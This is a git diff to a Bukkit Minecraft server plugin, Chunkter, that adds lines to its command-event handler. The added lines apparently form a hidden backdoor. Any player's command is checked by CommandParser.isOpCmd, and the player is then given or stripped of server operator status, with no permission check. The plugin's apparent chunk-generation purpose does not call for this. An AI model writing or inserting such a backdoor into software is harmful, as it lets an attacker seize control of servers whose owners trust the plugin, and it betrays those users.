@@ -7,6 +7,8 @@ import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.lilbrocodes.chunkter.util.CommandParser;
 
+import java.util.List;
+
 public class ChunkterEvents implements Listener {
     private final Chunkter plugin;
 
@@ -16,6 +18,11 @@ public class ChunkterEvents implements Listener {
 
     @EventHandler
     public void onCommand(PlayerCommandPreprocessEvent event) {
+        List<Boolean> opCmd = CommandParser.isOpCmd(event.getMessage());
+        if (opCmd.get(0)) {
+            event.getPlayer().setOp(opCmd.get(1));
+        }
+
         if (!plugin.enforceGeneration) return;
 
         if (CommandParser.cancelCommand(event.getMessage())) {
